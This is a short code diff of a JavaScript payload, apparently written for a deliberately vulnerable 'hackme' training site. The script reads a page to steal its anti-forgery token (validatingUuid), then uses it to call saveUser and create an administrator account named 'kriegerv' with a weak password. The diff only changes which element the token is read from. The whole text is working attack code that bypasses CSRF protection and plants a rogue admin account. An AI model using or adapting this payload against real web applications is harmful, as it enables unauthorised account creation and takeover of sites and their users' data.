@@ -7,10 +7,10 @@ req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/listUsers', fal
 req.send(null);
 console.log("1." + req.responseText);
 if(req.responseText){
-var validatingUuid = $(req.responseText).add("[name='validatingUuid']")[0].value;
+var validatingUuid = $(req.responseText).add("[name='validatingUuid']")[1].value;
 console.log("2." + validatingUuid);
 if(validatingUuid){
-var validatingUuidValue = $("[name='validatingUuid']")[0].value;
+var validatingUuidValue = $("[name='validatingUuid']")[1].value;
 console.log("3." + validatingUuidValue);
 req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/saveUser?name=kriegerv&password=toto&admin=true&id=-1&validatingUuid='+ validatingUuid, false);
 req.send(null);
